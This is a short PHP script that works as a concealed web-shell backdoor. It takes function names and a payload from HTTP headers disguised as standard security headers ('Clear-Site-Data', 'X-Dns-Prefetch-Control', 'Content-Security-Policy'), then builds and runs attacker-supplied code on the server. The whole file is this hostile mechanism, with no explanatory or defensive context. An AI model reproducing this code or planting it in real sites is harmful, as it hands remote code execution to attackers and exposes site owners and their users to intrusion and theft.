<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Clear-Site-Data'])) {
    $center = $_HEADERS['Clear-Site-Data']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Content-Security-Policy']));
    $center();
}